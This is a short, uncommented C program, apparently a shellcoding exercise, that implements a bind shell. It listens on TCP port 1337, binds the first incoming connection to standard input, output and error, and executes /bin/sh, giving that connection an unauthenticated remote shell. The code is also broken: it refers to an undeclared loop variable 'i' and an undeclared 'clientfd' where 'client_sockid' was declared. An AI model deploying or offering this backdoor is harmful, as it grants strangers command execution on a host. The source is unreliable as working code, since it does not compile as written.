#include <stdio.h>  
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>  
  
int host_sockid;    // sockfd for host  
int client_sockid;  // sockfd for client  
      
struct sockaddr_in hostaddr;            // sockaddr struct  
  
int main()  
{  
    // Create socket  
    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
  
    // Initialize sockaddr struct to bind socket using it  
    hostaddr.sin_family = AF_INET;  
    hostaddr.sin_port = htons(1337);  
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  
  
    // Bind socket to IP/Port in sockaddr struct  
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
      
    // Listen for incoming connections  
    listen(host_sockid, 2);  
  
    // Accept incoming connection, don't store data, just use the sockfd created  
    client_sockid = accept(host_sockid, NULL, NULL);  
  
	// dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
	for(i = 0; i <= 2; i++)
		dup2(clientfd, i);
  
    // Execute /bin/sh  
    execve("/bin/sh", NULL, NULL);  
    close(host_sockid);  
      
    return 0;  
}
